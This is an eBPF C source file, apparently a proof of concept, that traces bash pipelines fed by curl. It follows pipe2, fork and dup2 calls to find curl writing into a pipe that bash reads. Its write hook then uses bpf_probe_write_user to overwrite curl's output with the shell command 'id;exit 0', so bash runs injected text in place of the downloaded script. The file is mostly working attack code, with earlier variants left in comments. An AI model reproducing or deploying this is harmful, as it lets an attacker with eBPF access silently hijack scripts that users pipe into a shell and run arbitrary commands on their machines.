#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "main.h"

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 2048);
    __type(key, u32);
    __type(value, struct pipe_point_t);
} pipe_event_map SEC(".maps");

//struct {
//    __uint(type, BPF_MAP_TYPE_LRU_HASH);
//    __uint(max_entries, 2048);
//    __type(key, u32);
//    __type(value, u8);
//} pipe_events_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 2048);
    __type(key, u32);
    __type(value, u8);
} dup_event_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 2048);
//    __type(key, struct pipe_fd_key_t);
    __type(key, u32);
    __type(value, struct pipe_fd_val_t);
} pipe_fd_map SEC(".maps");
//
//struct {
//    __uint(type, BPF_MAP_TYPE_LRU_HASH);
//    __uint(max_entries, 2048);
//    __type(key, u32);
//    __type(value, u32);
//} fork_map SEC(".maps");
//
//struct {
//    __uint(type, BPF_MAP_TYPE_LRU_HASH);
//    __uint(max_entries, 2048);
//    __type(key, struct dup_fd_key_t);
//    __type(value, int);
//} dup_fd_map SEC(".maps");
//
//struct {
//    __uint(type, BPF_MAP_TYPE_LRU_HASH);
//    __uint(max_entries, 2048);
//    __type(key, u64);
//    __type(value, struct read_buf_t);
//} read_buf_map SEC(".maps");
//
//struct {
//    __uint(type, BPF_MAP_TYPE_LRU_HASH);
//    __uint(max_entries, 2048);
//    __type(key, u64);
//    __type(value, struct write_buf_t);
//} write_event_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
} events SEC(".maps");


SEC("tracepoint/syscalls/sys_enter_pipe2")
int sys_enter_pipe2(struct trace_event_raw_sys_enter *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct pipe_point_t val = {};

    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    if (!str_eq(comm, "bash", TASK_COMM_LEN)) {
        return 0;
    }

    int *fildes = (int *)BPF_CORE_READ(ctx, args[0]);
    val.fildes = fildes;

    bpf_map_update_elem(&pipe_event_map, &pid, &val, BPF_ANY);
//
//    u8 zero = 0;
//    bpf_map_update_elem(&pipe_events_map, &pid, &zero, BPF_ANY);

    bpf_printk("sys_enter_pipe2: %s", comm);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_pipe2")
int sys_exit_pipe2(struct trace_event_raw_sys_exit *ctx) {
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));

    if (!str_eq(comm, "bash", TASK_COMM_LEN)) {
        return 0;
    }

    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct pipe_point_t *val;

    val = bpf_map_lookup_elem(&pipe_event_map, &pid);
    if (!val) {
        return 0;
    }
    if (bpf_map_lookup_elem(&pipe_fd_map, &pid)) {
        return 0;
    }


    int fd[2];
    bpf_probe_read_user(fd, sizeof(fd), val->fildes);

    struct pipe_fd_val_t fd_val = {};
    fd_val.read_fd = fd[0];
    fd_val.write_fd = fd[1];
    bpf_map_update_elem(&pipe_fd_map, &pid, &fd_val, BPF_ANY);

    bpf_printk("sys_exit_pipe2: %s, (%d, %d)", comm, fd[0], fd[1]);

    return 0;
}

SEC("tracepoint/sched/sched_process_fork")
int sched_process_fork(struct trace_event_raw_sched_process_fork *ctx) {
    u32 parent_pid = (u32) BPF_CORE_READ(ctx, parent_pid);
    u32 child_pid = (u32) BPF_CORE_READ(ctx, child_pid);

    struct pipe_fd_val_t *fd_val;
    fd_val = bpf_map_lookup_elem(&pipe_fd_map, &parent_pid);
    if (!fd_val) {
        return 0;
    }
//    if (!bpf_map_lookup_elem(&pipe_events_map, &parent_pid)) {
//        return 0;
//    }

    bpf_map_update_elem(&pipe_fd_map, &child_pid, fd_val, BPF_ANY);

//    u8 zero = 0;
//    bpf_map_update_elem(&pipe_events_map, &child_pid, &zero, BPF_ANY);

    char parent_comm[TASK_COMM_LEN];
    char child_comm[TASK_COMM_LEN];
    bpf_probe_read(parent_comm, sizeof(parent_comm), BPF_CORE_READ(ctx, parent_comm));
    bpf_probe_read(child_comm, sizeof(child_comm), BPF_CORE_READ(ctx, child_comm));
    // struct sock *sk = v;
    bpf_printk("sched_process_fork: parent_comm: %s child_comm: %s, %d", parent_comm, child_comm, child_pid);

    return 0;
}

SEC("tracepoint/syscalls/sys_enter_dup2")
int sys_enter_dup2(struct trace_event_raw_sys_enter *ctx) {
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    if (!str_eq(comm, "bash", TASK_COMM_LEN)) {
        return 0;
    }

    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    u32 pid = bpf_get_current_pid_tgid() >> 32;
//    u32 ppid = BPF_CORE_READ(task, real_parent, tgid);

    struct pipe_fd_val_t *fd_val;
    fd_val = bpf_map_lookup_elem(&pipe_fd_map, &pid);
    if (!fd_val) {
        return 0;
    }
//
//    u32 *expect_ppid = bpf_map_lookup_elem(&fork_map, &pid);
//    if (!expect_ppid) {
//        return 0;
//    }
//    if (ppid != *expect_ppid) {
//        return 0;
//    }

    int fd1 = (int)BPF_CORE_READ(ctx, args[0]);
    int fd2 = (int)BPF_CORE_READ(ctx, args[1]);
    if (fd2 != 1 || fd1 != fd_val->write_fd) {
        return 0;
    }

//    if (fd1 != fd_val->write_fd && fd2 != fd_val->read_fd) {
//        return 0;
//    }

//    if (fd2 == 0 && !str_eq(comm, "bash", TASK_COMM_LEN)) {
//        return 0;
//    }
//    if (fd2 == 1 && !str_eq(comm, "curl", TASK_COMM_LEN)) {
//        return 0;
//    }
//    if (fd1 > 1 && fd2 > 1) {
//        return 0;
//    }
//    if (!bpf_map_lookup_elem(&pipe_events_map, &pid)) {
//        return 0;
//    }

    u8 zero = 0;
    bpf_map_update_elem(&dup_event_map, &pid, &zero, BPF_ANY);

//    struct dup_fd_key_t key = {};
//    key.pid = pid;
//    key.src_fd = fd2;
////    struct dup_fd_val_t val = {};
////    val.target_fd = fd1;
//
//    bpf_map_update_elem(&dup_fd_map, &key, &fd1, BPF_ANY);
    // struct sock *sk = v;
    bpf_printk("r: %d, w: %d", fd_val->read_fd, fd_val->write_fd);
    bpf_printk("sys_enter_dup2: %s %d->%d", comm, fd2, fd1);

    return 0;
}


//SEC("tracepoint/syscalls/sys_enter_execve")
//int sys_enter_execve(struct trace_event_raw_sys_enter *ctx) {
//    char comm[TASK_COMM_LEN];
//    bpf_get_current_comm(&comm, sizeof(comm));
//    if (!(str_eq(comm, "bash", TASK_COMM_LEN) || str_eq(comm, "curl", TASK_COMM_LEN))) {
//        return 0;
//    }
//
//    bpf_printk("sys_enter_execve: %s", comm);
//
//    return 0;
//}
//
//
//SEC("tracepoint/syscalls/sys_enter_read")
//int sys_enter_read(struct trace_event_raw_sys_enter *ctx) {
//    u32 pid = bpf_get_current_pid_tgid() >> 32;
////    if (!bpf_map_lookup_elem(&fork_map, &pid)) {
////        return 0;
////    }
////    struct pipe_fd_val_t *fd_val;
////    fd_val = bpf_map_lookup_elem(&pipe_fd_map, &pid);
////    if (!fd_val) {
////        return 0;
////    }
//
//    if (!bpf_map_lookup_elem(&dup_event_map, &pid)) {
//        return 0;
//    }
//
//    int fd = (int) BPF_CORE_READ(ctx, args[0]);
//    if (fd != 0) {
//        return 0;
//    }
//
//    long count = (long) BPF_CORE_READ(ctx, args[2]);
//
//    char comm[TASK_COMM_LEN];
//    bpf_get_current_comm(&comm, sizeof(comm));
//
////    if (!(str_eq(comm, "bash", TASK_COMM_LEN) || str_eq(comm, "curl", TASK_COMM_LEN) || str_eq(comm, "cat", TASK_COMM_LEN))) {
////        return 0;
////    }
//
//    struct dup_fd_key_t key = {};
//    key.pid = pid;
//    key.src_fd = fd;
//    int *target_fd = bpf_map_lookup_elem(&dup_fd_map, &key);
//    if (!target_fd) {
//        return 0;
//    }
////    if (target_fd)
//
//    u64 tid = bpf_get_current_pid_tgid();
//    long unsigned int buf = (long unsigned int)BPF_CORE_READ(ctx, args[1]);
//    struct read_buf_t val = {};
//    val.buf_p = buf;
//
//    struct read_buf_t *old_val = bpf_map_lookup_elem(&read_buf_map, &tid);
//    if (old_val) {
//        val.read_count += old_val->read_count;
//    }
//    bpf_map_update_elem(&read_buf_map, &tid, &val, BPF_ANY);
//
//    // struct sock *sk = v;
//    bpf_printk("sys_enter_read: %s, fd: %d, count: %d", comm, fd, count);
//
//    return 0;
//}
//
//SEC("tracepoint/syscalls/sys_exit_read")
//int tracepoint_syscalls__sys_exit_read(struct trace_event_raw_sys_exit *ctx) {
////    return 0;
//    u32 pid = bpf_get_current_pid_tgid() >> 32;
////    if (!bpf_map_lookup_elem(&fork_map, &pid)) {
////        return 0;
////    }
////    struct pipe_fd_val_t *fd_val;
////    fd_val = bpf_map_lookup_elem(&pipe_fd_map, &pid);
////    if (!fd_val) {
////        return 0;
////    }
//    if (!bpf_map_lookup_elem(&dup_event_map, &pid)) {
//        return 0;
//    }
//
//    int ret = (int) BPF_CORE_READ(ctx, ret);
//
//    char comm[TASK_COMM_LEN];
//    bpf_get_current_comm(&comm, sizeof(comm));
//
//    if (!(str_eq(comm, "bash", TASK_COMM_LEN) || str_eq(comm, "curl", TASK_COMM_LEN) || str_eq(comm, "cat", TASK_COMM_LEN))) {
//        return 0;
//    }
//
//    u64 tid = bpf_get_current_pid_tgid();
//    struct read_buf_t *val = bpf_map_lookup_elem(&read_buf_map, &tid);
//    if (!val) {
//        return 0;
//    }
//    long unsigned int buffer = val->buf_p;
//    if (buffer <= 0) {
//        return 0;
//    }
//
//    char content[64] = "id;\n";
////    bpf_probe_read_user(&content, sizeof(content), (char *)buffer);
//    char replace[64] = "i";
//    int next = val->read_count;
//    if (next > 4) {
//        return 0;
//    }
//    val->read_count++;
////    replace[0] = content[next];
//
////    bpf_probe_write_user((void *)buffer, replace, 1);
//
//    // struct sock *sk = v;
//    bpf_printk("sys_exit_read: %s %d %s", comm, ret, content);
//
//    return 0;
//}

SEC("tracepoint/syscalls/sys_enter_write")
int tracepoint_syscalls__sys_enter_write(struct trace_event_raw_sys_enter *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
//    if (!bpf_map_lookup_elem(&fork_map, &pid)) {
//        return 0;
//    }
//    struct pipe_fd_val_t *fd_val;
//    fd_val = bpf_map_lookup_elem(&pipe_fd_map, &pid);
//    if (!fd_val) {
//        return 0;
//    }
    if (!bpf_map_lookup_elem(&dup_event_map, &pid)) {
        return 0;
    }

    int fd = (int) BPF_CORE_READ(ctx, args[0]);
    if (fd != 1) {
        return 0;
    }

    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    if (!str_eq(comm, "curl", TASK_COMM_LEN)) {
        return 0;
    }
    long count = (long) BPF_CORE_READ(ctx, args[2]);

    char replace[64] = "id;exit 0\n";
    int size = str_len(replace, 64);
    if (count < size) {
        return 0;
    }

    void *buffer = (void *)BPF_CORE_READ(ctx, args[1]);
    bpf_probe_write_user(buffer, replace, size);

    // struct sock *sk = v;
    bpf_printk("sys_enter_write: %s, fd: %d, count: %d", comm, fd, count);

    return 0;
}

//SEC("tracepoint/syscalls/sys_exit_write")
//int tracepoint_syscalls__sys_exit_write(struct trace_event_raw_sys_exit *ctx) {
//    return 0;
//    u32 pid = bpf_get_current_pid_tgid() >> 32;
////    if (!bpf_map_lookup_elem(&fork_map, &pid)) {
////        return 0;
////    }
////    struct pipe_fd_val_t *fd_val;
////    fd_val = bpf_map_lookup_elem(&pipe_fd_map, &pid);
////    if (!fd_val) {
////        return 0;
////    }
//    if (!bpf_map_lookup_elem(&dup_event_map, &pid)) {
//        return 0;
//    }
//
//    int ret = (int) BPF_CORE_READ(ctx, ret);
//
//    char comm[TASK_COMM_LEN];
//    bpf_get_current_comm(&comm, sizeof(comm));
//
//    if (!str_eq(comm, "curl", TASK_COMM_LEN)) {
//        return 0;
//    }
//
//    // struct sock *sk = v;
//    bpf_printk("sys_exit_write: %s %d", comm, ret);
//
//    return 0;
//}
//
//SEC("tracepoint/syscalls/sys_enter_clone")
//int tracepoint_syscalls__sys_enter_clone(struct trace_event_raw_sys_enter *ctx) {
//
//    char comm[TASK_COMM_LEN];
//    bpf_get_current_comm(&comm, sizeof(comm));
//
//    if (!(str_eq(comm, "bash", TASK_COMM_LEN) || str_eq(comm, "curl", TASK_COMM_LEN) || str_eq(comm, "cat", TASK_COMM_LEN))) {
//        return 0;
//    }
////
////    long ret = (long) BPF_CORE_READ(ctx, ret);
//    bpf_printk("sys_enter_clone: %s %d", comm);
//
//    return 0;
//}
//
//
//SEC("tracepoint/syscalls/sys_exit_clone")
//int tracepoint_syscalls__sys_exit_clone(struct trace_event_raw_sys_exit *ctx) {
//
//    char comm[TASK_COMM_LEN];
//    bpf_get_current_comm(&comm, sizeof(comm));
//
//    if (!(str_eq(comm, "bash", TASK_COMM_LEN) || str_eq(comm, "curl", TASK_COMM_LEN) || str_eq(comm, "cat", TASK_COMM_LEN))) {
//        return 0;
//    }
//
//    long ret = (long) BPF_CORE_READ(ctx, ret);
//    bpf_printk("sys_exit_clone: %s %d", comm, ret);
//
//    return 0;
//}

SEC("tracepoint/syscalls/sys_exit_exit_group")
int sys_exit_exit_group(struct trace_event_raw_sys_exit *ctx) {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    u32 pid = bpf_get_current_pid_tgid() >> 32;
//    u32 ppid = BPF_CORE_READ(task, real_parent, tgid);

    bpf_map_delete_elem(&pipe_event_map, &pid);
    bpf_map_delete_elem(&pipe_fd_map, &pid);
    bpf_map_delete_elem(&dup_event_map, &pid);

    return 0;
}


char _license[] SEC("license") = "GPL";
